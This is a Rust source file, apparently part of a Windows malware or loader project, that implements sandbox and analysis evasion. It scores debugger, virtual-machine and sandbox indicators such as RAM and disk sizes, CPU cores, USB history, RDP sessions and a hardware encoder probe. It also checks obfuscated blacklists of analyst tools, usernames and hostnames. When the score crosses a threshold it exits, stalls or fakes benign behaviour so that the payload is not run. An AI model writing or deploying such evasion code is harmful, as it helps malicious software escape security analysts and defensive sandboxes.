#![allow(dead_code)]
use std::path::Path;
use std::time::Duration;
use std::ffi::c_void;

use windows::core::w;
use windows::Win32::Foundation::{BOOL, CloseHandle, HANDLE, HWND, LPARAM, MAX_PATH, POINT};
use windows::Win32::Storage::FileSystem::GetDiskFreeSpaceExW;
use windows::Win32::System::Diagnostics::Debug::IsDebuggerPresent;
use windows::Win32::System::ProcessStatus::{EnumProcesses, GetModuleBaseNameW};
use windows::Win32::System::SystemInformation::{
    GetTickCount64, GlobalMemoryStatusEx, MEMORYSTATUSEX,
};
use windows::Win32::System::Threading::{OpenProcess, PROCESS_QUERY_INFORMATION, PROCESS_VM_READ, GetCurrentProcess};
use windows::Win32::UI::WindowsAndMessaging::{
    EnumWindows, GetSystemMetrics, GetWindowTextW, SM_CXSCREEN, SM_CYSCREEN, SM_REMOTESESSION,
};
use windows::Win32::Graphics::Gdi::{
    GetDC, GetDeviceCaps, VREFRESH, ReleaseDC,
};
use windows::Win32::NetworkManagement::IpHelper::{
    GetAdaptersInfo, IP_ADAPTER_INFO,
};
use windows::Win32::System::Registry::{
    RegOpenKeyExW, RegQueryInfoKeyW, RegQueryValueExW, RegCloseKey, HKEY_LOCAL_MACHINE, KEY_READ, HKEY, REG_VALUE_TYPE,
};
use windows::Win32::System::Com::{
    CoCreateInstance, CoInitializeEx, CoUninitialize, CoTaskMemFree, CLSCTX_INPROC_SERVER, COINIT_MULTITHREADED,
};
use windows::Win32::Media::MediaFoundation::{
    MFTEnumEx, MFT_CATEGORY_VIDEO_ENCODER, MFT_ENUM_FLAG_HARDWARE, MFT_REGISTER_TYPE_INFO,
    MFStartup, MFShutdown, MFCreateMediaType, MFCreateSinkWriterFromURL, MFCreateAttributes,
    MFMediaType_Video, MFVideoFormat_H264, MFVideoFormat_RGB32, MFVideoInterlace_Progressive,
    MF_VERSION, MFSTARTUP_FULL, MF_MT_MAJOR_TYPE, MF_MT_SUBTYPE, MF_MT_AVG_BITRATE,
    MF_MT_FRAME_SIZE, MF_MT_FRAME_RATE, MF_MT_INTERLACE_MODE, MF_READWRITE_ENABLE_HARDWARE_TRANSFORMS,
    IMFActivate, IMFMediaType, IMFAttributes,
};
use windows::Win32::Security::{
    GetTokenInformation, TokenElevation, TOKEN_QUERY, TOKEN_ELEVATION, CheckTokenMembership,
};

use crate::utils::cpuid::CpuId;
use crate::core::exit_patcher::safe_exit;

#[derive(Debug, Clone, Copy, PartialEq)]
pub enum EvasionAction {
    ExitSilently,  // exit immediately
    DelayThenExit, // rand wait and exit
    ReportOnly,    // do nothing, just return result
    FakeBehavior,  // do normal behavior (not run payload)
    InfiniteSleep, // sleep forever (looks idle, not evasive)
}

pub struct AntiAnalysisConfig {
    pub min_score_threshold: u32,
    pub action: EvasionAction,
    pub delay_range: (u64, u64),
}

impl Default for AntiAnalysisConfig {
    fn default() -> Self {
        Self {
            min_score_threshold: 50,
            action: EvasionAction::DelayThenExit,
            delay_range: (30, 120),
        }
    }
}

#[derive(Debug, Clone, Default)]
pub struct DetectionItem {
    pub category: String,
    pub reason: String,
    pub weight: u32,
}

#[derive(Debug, Clone, Default)]
pub struct DetectionResult {
    pub total_score: u32,
    pub is_detected: bool,
    pub detections: Vec<DetectionItem>,
}

pub fn run_checks(config: &AntiAnalysisConfig) -> DetectionResult {
    let mut result = DetectionResult::default();

    check_desktop (&mut result);  // check for rtf format
    check_testmode(&mut result);  // check for testmode
    check_uptime  (&mut result);  // check for uptime
    check_debugger(&mut result);  // check for debugger
    check_blu     (&mut result);  // check for blacklisted users
    
    if result.total_score >= config.min_score_threshold {
        result.is_detected = true;
        return result;
    }

    check_syspec  (&mut result);  // check for ram/disk
    check_cpu     (&mut result);  // check the cpuid
    check_cpu     (&mut result);  // check the cpuid
    // check_network (&mut result);  // check adapter info (Disabled: FP with Hyper-V)
    check_usbh    (&mut result);  // check registry enum
    check_usbh    (&mut result);  // check registry enum
    check_blp     (&mut result);  // check process blacklist
    check_mact    (&mut result);  // check mac address
    check_drr     (&mut result);  // check display refresh

    if result.total_score >= config.min_score_threshold {
        result.is_detected = true;
        return result;
    }

    check_hwe     (&mut result);  // check for hardware encoder

    result.is_detected = result.total_score >= config.min_score_threshold;
    result
}

#[allow(dead_code)]
pub fn run_and_evade(config: &AntiAnalysisConfig) -> bool {
    let result = run_checks(config);

    if result.is_detected {
        match config.action {
            EvasionAction::ExitSilently => {
                safe_exit(0);
            }
            EvasionAction::DelayThenExit => {
                random_delay(config.delay_range);
                safe_exit(0);
            }
            EvasionAction::FakeBehavior => {
                fake_behavior();
                safe_exit(0);
            }
            EvasionAction::InfiniteSleep => {
                loop {
                    std::thread::sleep(std::time::Duration::from_secs(3600));
                }
            }
            EvasionAction::ReportOnly => {
                return true;
            }
        }
    }

    false
}

pub fn random_delay(range: (u64, u64)) {
    use std::time::{SystemTime, UNIX_EPOCH};
    let seed = SystemTime::now().duration_since(UNIX_EPOCH).unwrap().as_nanos() as u64;
    let delay_secs = range.0 + (seed % (range.1 - range.0 + 1));
    std::thread::sleep(Duration::from_secs(delay_secs));
}

fn add_detection(result: &mut DetectionResult, category: &str, reason: &str, weight: u32) {
    result.detections.push(DetectionItem {
        category: category.to_string(),
        reason: reason.to_string(),
        weight,
    });
    result.total_score += weight;
}

fn check_hwe(result: &mut DetectionResult) {
    let is_real_hardware = unsafe { check_hardware_authenticity_inner() };
    if !is_real_hardware {
        add_detection(result, "Hardware", "No Real Hardware Encoder (MFT Pipeline Failed)", 100);
    }
}

struct MfSession {
    com_initialized: bool,
    mf_started: bool,
}

impl MfSession {
    unsafe fn new() -> windows::core::Result<Self> {
        if CoInitializeEx(None, COINIT_MULTITHREADED).is_err() {
            return Err(windows::core::Error::from_win32());
        }

        match MFStartup(MF_VERSION, MFSTARTUP_FULL) {
            Ok(_) => Ok(Self {
                com_initialized: true,
                mf_started: true,
            }),
            Err(e) => {
                CoUninitialize();
                Err(e)
            }
        }
    }
}

impl Drop for MfSession {
    fn drop(&mut self) {
        unsafe {
            if self.mf_started {
                let _ = MFShutdown();
            }
            if self.com_initialized {
                CoUninitialize();
            }
        }
    }
}

unsafe fn check_hardware_authenticity_inner() -> bool {
    let _guard = match MfSession::new() {
        Ok(g) => g,
        Err(_) => return false,
    };

    let has_hw_encoder = check_hw_encoders().map(|count| count > 0).unwrap_or(false);
    if !has_hw_encoder {
        return false;
    }

    try_hw_h264_pipeline().unwrap_or(false)
}

unsafe fn check_hw_encoders() -> windows::core::Result<u32> {
    let mut count: u32 = 0;
    let mut activates: *mut Option<IMFActivate> = std::ptr::null_mut();

    let output_info = MFT_REGISTER_TYPE_INFO {
        guidMajorType: MFMediaType_Video,
        guidSubtype: MFVideoFormat_H264,
    };

    let res = MFTEnumEx(
        MFT_CATEGORY_VIDEO_ENCODER,
        MFT_ENUM_FLAG_HARDWARE,
        None,
        Some(&output_info),
        &mut activates,
        &mut count,
    );

    if res.is_ok() && !activates.is_null() {
        for i in 0..count as usize {
            std::ptr::drop_in_place(activates.add(i));
        }
        CoTaskMemFree(Some(activates as *const _));
    }

    res.map(|_| count)
}

unsafe fn try_hw_h264_pipeline() -> windows::core::Result<bool> {
    let mut attributes: Option<IMFAttributes> = None;
    MFCreateAttributes(&mut attributes, 1)?;

    let Some(attributes) = attributes else {
        return Ok(false);
    };

    let _ = attributes.SetUINT32(&MF_READWRITE_ENABLE_HARDWARE_TRANSFORMS, 1);

    let path_to_use = pick_probe_path();
    let _delete_probe = FileDeleteGuard::new(path_to_use.clone());

    let output_path: Vec<u16> = path_to_use.encode_utf16().chain(Some(0)).collect();
    let writer = MFCreateSinkWriterFromURL(windows::core::PCWSTR(output_path.as_ptr()), None, &attributes)?;

    let output_mt = create_h264_type()?;
    let stream_idx = writer.AddStream(&output_mt)?;

    let input_mt = create_input_type()?;
    let _ = writer.SetInputMediaType(stream_idx, &input_mt, None);

    Ok(writer.BeginWriting().is_ok())
}

fn pick_probe_path() -> String {
    let preferred = obfstr::obfstr!("C:\\Windows\\Temp\\hw_probe.mp4").to_string();
    if std::fs::write(&preferred, b"").is_ok() {
        let _ = std::fs::remove_file(&preferred);
        return preferred;
    }

    std::env::temp_dir()
        .join("hw_probe.mp4")
        .to_string_lossy()
        .to_string()
}

struct FileDeleteGuard {
    path: String,
}

impl FileDeleteGuard {
    fn new(path: String) -> Self {
        Self { path }
    }
}

impl Drop for FileDeleteGuard {
    fn drop(&mut self) {
        let _ = std::fs::remove_file(&self.path);
    }
}

unsafe fn create_h264_type() -> windows::core::Result<IMFMediaType> {
    let mt = MFCreateMediaType()?;
    mt.SetGUID(&MF_MT_MAJOR_TYPE, &MFMediaType_Video)?;
    mt.SetGUID(&MF_MT_SUBTYPE, &MFVideoFormat_H264)?;
    mt.SetUINT32(&MF_MT_AVG_BITRATE, 4_000_000)?;
    mt.SetUINT64(&MF_MT_FRAME_SIZE, ((1280u64) << 32) | 720u64)?;
    mt.SetUINT64(&MF_MT_FRAME_RATE, ((30u64) << 32) | 1u64)?;
    mt.SetUINT32(&MF_MT_INTERLACE_MODE, MFVideoInterlace_Progressive.0 as u32)?;
    Ok(mt)
}

unsafe fn create_input_type() -> windows::core::Result<IMFMediaType> {
    let mt = MFCreateMediaType()?;
    mt.SetGUID(&MF_MT_MAJOR_TYPE, &MFMediaType_Video)?;
    mt.SetGUID(&MF_MT_SUBTYPE, &MFVideoFormat_RGB32)?;
    mt.SetUINT64(&MF_MT_FRAME_SIZE, ((1280u64) << 32) | 720u64)?;
    Ok(mt)
}

fn check_drr(result: &mut DetectionResult) {
    unsafe {
        let hdc = GetDC(None);
        let refresh_rate = GetDeviceCaps(Some(hdc), VREFRESH);
        
        ReleaseDC(None, hdc);

        if refresh_rate < 25 {
            add_detection(result, "Display", &format!("Low Refresh Rate: {} Hz", refresh_rate), 40);
        }
    }

    unsafe {
        if GetSystemMetrics(SM_REMOTESESSION) != 0 {
             add_detection(result, "Display", "Remote Session Detected (RDP)", 60);
        }
    }
}

fn check_network(_result: &mut DetectionResult) {
    // Disabled to prevent False Positives with Hyper-V / Virtual Ethernet Adapters
}

fn check_usbh(result: &mut DetectionResult) {
    let keys_to_check = [
        r"SYSTEM\CurrentControlSet\Enum\USBSTOR",
        r"SYSTEM\CurrentControlSet\Enum\USB",
    ];

    for key in keys_to_check {
        unsafe {
            let mut hkey: HKEY = HKEY::default();
            let wide_key = windows::core::HSTRING::from(key);
            
            let opened = RegOpenKeyExW(
                HKEY_LOCAL_MACHINE, 
                windows::core::PCWSTR::from_raw(wide_key.as_ptr()), 
                Some(0), 
                KEY_READ, 
                &mut hkey
            );

            if opened.is_ok() {
                let mut subkeys_count: u32 = 0;
                let _ = RegQueryInfoKeyW(
                    hkey,
                    Some(windows::core::PWSTR::null()),
                    None,
                    None,
                    Some(&mut subkeys_count),
                    None,
                    None,
                    None,
                    None,
                    None,
                    None,
                    None,
                );
                
                if key.contains("USBSTOR") && subkeys_count == 0 {
                    add_detection(result, "Environment", "No USB Storage history detected", 30);
                }

                let _ = CloseHandle(HANDLE(hkey.0 as isize as *mut c_void));
            }
        }
    }
}

fn check_syspec(result: &mut DetectionResult) {
    unsafe {
        let mut mem_status = MEMORYSTATUSEX::default();
        mem_status.dwLength = std::mem::size_of::<MEMORYSTATUSEX>() as u32;
        if GlobalMemoryStatusEx(&mut mem_status).is_ok() {
            let total_gb_val = mem_status.ullTotalPhys as f64 / (1024.0 * 1024.0 * 1024.0);
            if total_gb_val < 3.5 {
                add_detection(result, "Specs", &format!("Low RAM: {:.2} GB", total_gb_val), 60);
            }
            
            if total_gb_val > 4.8 && total_gb_val < 5.2 {
                add_detection(result, "Specs", &format!("Suspicious RAM size: {:.2} GB (Likely VM Config)", total_gb_val), 80);
            }
        }
    }

    unsafe {
        let mut free_bytes_available = 0u64;
        let mut total_number_of_bytes = 0u64;
        let mut total_number_of_free_bytes = 0u64;
        
        let path = w!("C:\\");
        if GetDiskFreeSpaceExW(
            path,
            Some(&mut free_bytes_available),
            Some(&mut total_number_of_bytes),
            Some(&mut total_number_of_free_bytes),
        ).is_ok() {
            let total_gb = total_number_of_bytes / (1024 * 1024 * 1024);
            
            if total_gb < 60 {
                add_detection(result, "Specs", &format!("Small Disk: {} GB", total_gb), 50);
            }

            let suspicious_sizes = [60, 70, 80, 90, 100, 110];
            let safe_sizes = [64, 128, 250, 256, 500, 512]; // Common SSD sizes

            let mut is_suspicious = false;
            let mut is_safe = false;

            for &bad in &suspicious_sizes {
                if total_gb >= (bad - 2) && total_gb <= (bad + 2) {
                    is_suspicious = true;
                    break;
                }
            }

            for &safe in &safe_sizes {
                if total_gb >= (safe - 2) && total_gb <= (safe + 2) {
                    is_safe = true;
                    break;
                }
            }

            if is_suspicious && !is_safe {
                add_detection(result, "Specs", &format!("Suspicious Disk Size: {} GB (Likely specific VM alloc)", total_gb), 70);
            }
        }
    }
}

fn check_uptime(result: &mut DetectionResult) {
    unsafe {
        let tick = GetTickCount64();
        let days = tick / (1000 * 60 * 60 * 24);
        if days > 20 {
            add_detection(result, "Heuristic", &format!("High Uptime: {} days (Possible Snapshot)", days), 50);
        }
    }
}

fn check_cpu(result: &mut DetectionResult) {
    let cpu = CpuId::get();
    let cores = cpu.cores;
    let brand = cpu.brand.to_lowercase();

    if cores < 2 {
        add_detection(result, "Hardware", &format!("CPU Core Count: {} (Too Low)", cores), 90);
    }

    if (brand.contains("i9") || brand.contains("ryzen 9")) && cores < 6 {
         add_detection(result, "Hardware", &format!("CPU Mismatch: High-end brand '{}' but only {} cores", cpu.brand, cores), 100);
    } else if (brand.contains("i7") || brand.contains("ryzen 7")) && cores < 4 {
         add_detection(result, "Hardware", &format!("CPU Mismatch: High-end brand '{}' but only {} cores", cpu.brand, cores), 80);
    } else if (brand.contains("xeon") || brand.contains("threadripper")) && cores < 4 {
         add_detection(result, "Hardware", &format!("CPU Mismatch: Server brand '{}' but only {} cores", cpu.brand, cores), 100);
    }
}

fn check_desktop(result: &mut DetectionResult) {
    if let Ok(user_profile) = std::env::var("USERPROFILE") {
        let desktop_path = Path::new(&user_profile).join("Desktop");
        if desktop_path.exists() {
            if let Ok(entries) = std::fs::read_dir(desktop_path) {
                let rtf_count = entries
                    .filter_map(|e| e.ok())
                    .filter(|e| {
                        if let Ok(fname) = e.file_name().into_string() {
                            fname.to_lowercase().ends_with(".rtf")
                        } else {
                            false
                        }
                    })
                    .count();

                if rtf_count > 1 {
                    add_detection(result, "Heuristic", &format!("Suspicious Desktop: {} RTF files found", rtf_count), 100);
                }
            }
        }
    }
}

fn check_testmode(result: &mut DetectionResult) {
    let key = r"SYSTEM\CurrentControlSet\Control";
    unsafe {
        let mut hkey: HKEY = HKEY::default();
        let wide_key = windows::core::HSTRING::from(key);
        
        let opened = RegOpenKeyExW(
            HKEY_LOCAL_MACHINE, 
            windows::core::PCWSTR::from_raw(wide_key.as_ptr()), 
            Some(0), 
            KEY_READ, 
            &mut hkey
        );

        if opened.is_ok() {
            let value_name = w!("SystemStartOptions");
            let mut buffer_size: u32 = 1024;
            let mut buffer: Vec<u8> = vec![0; buffer_size as usize];
            let mut val_type = REG_VALUE_TYPE::default();

            let query = RegQueryValueExW(
                hkey,
                windows::core::PCWSTR::from_raw(value_name.as_ptr()),
                None, 
                Some(&mut val_type),
                Some(buffer.as_mut_ptr()),    
                Some(&mut buffer_size)
            );

            if query.is_ok() {
                let slice = std::slice::from_raw_parts(buffer.as_ptr() as *const u16, (buffer_size / 2) as usize);
                let opts = String::from_utf16_lossy(slice).to_lowercase();
                
                if opts.contains("testsigning") {
                    add_detection(result, "System", "Windows Test Mode Enabled (TESTSIGNING)", 80);
                }
            }
            
            let _ = RegCloseKey(hkey);
        }
    }
}

fn check_debugger(result: &mut DetectionResult) {
    if unsafe { IsDebuggerPresent().as_bool() } {
        add_detection(result, "Debugger", "IsDebuggerPresent() == true", 100);
    }
}

fn check_blp(result: &mut DetectionResult) {
    let running = get_running_processes();
    let mut found_count = 0;

    for p in &running {
        let lower = p.to_lowercase();
        
        let is_blacklisted = 
            lower == obfstr::obfstr!("wireshark.exe") ||
            lower == obfstr::obfstr!("fiddler.exe") ||
            lower == obfstr::obfstr!("x64dbg.exe") ||
            lower == obfstr::obfstr!("ollydbg.exe") ||
            lower == obfstr::obfstr!("processhacker.exe") ||
            lower == obfstr::obfstr!("vmtoolsd.exe") ||
            lower == obfstr::obfstr!("vboxservice.exe") ||
            lower == obfstr::obfstr!("joeboxserver.exe") ||
            lower == obfstr::obfstr!("ida.exe") ||
            lower == obfstr::obfstr!("ida64.exe") ||
            lower == obfstr::obfstr!("ghidra.exe") ||
            lower == obfstr::obfstr!("ccleaner.exe") ||
            lower == obfstr::obfstr!("ccleaner64.exe");

        if is_blacklisted {
            add_detection(result, obfstr::obfstr!("Process"), &format!("Blacklisted process: {}", p), 50);
            found_count += 1;
        }
    }
    
    if running.len() < 40 {
        add_detection(result, obfstr::obfstr!("Process"), &format!("Low process count: {}", running.len()), 30);
    }
}

fn check_blu(result: &mut DetectionResult) {
    if let Ok(user) = std::env::var(obfstr::obfstr!("USERNAME")) {
        let lower = user.to_lowercase();
        
        let is_blacklisted = 
            lower == obfstr::obfstr!("admin") ||
            lower == obfstr::obfstr!("user") ||
            lower == obfstr::obfstr!("sandbox") ||
            lower == obfstr::obfstr!("virus") ||
            lower == obfstr::obfstr!("malware") ||
            lower == obfstr::obfstr!("test") ||
            lower == obfstr::obfstr!("currentuser") ||
            lower == obfstr::obfstr!("username") ||
            lower == obfstr::obfstr!("john") ||
            lower == obfstr::obfstr!("emily") ||
            lower == obfstr::obfstr!("george") ||
            lower == obfstr::obfstr!("bruno") ||
            lower == obfstr::obfstr!("dekker");

        if is_blacklisted {
            add_detection(result, obfstr::obfstr!("User"), &format!("Blacklisted username: {}", user), 60);
        }
    }
    
    if let Ok(host) = std::env::var(obfstr::obfstr!("COMPUTERNAME")) {
        let lower = host.to_lowercase();
        if lower.contains(obfstr::obfstr!("sandbox")) || lower == obfstr::obfstr!("user-pc") {
            add_detection(result, obfstr::obfstr!("User"), &format!("Suspicious hostname: {}", host), 40);
        }
    }
}

fn check_mact(_result: &mut DetectionResult) {}
fn get_running_processes() -> Vec<String> {
    crate::utils::syscall::get_filtered_process_names()
}


fn fake_behavior() {
    random_delay((2, 5));
    let _ = std::fs::read_to_string(obfstr::obfstr!("C:\\Windows\\System32\\drivers\\etc\\hosts")); 
}
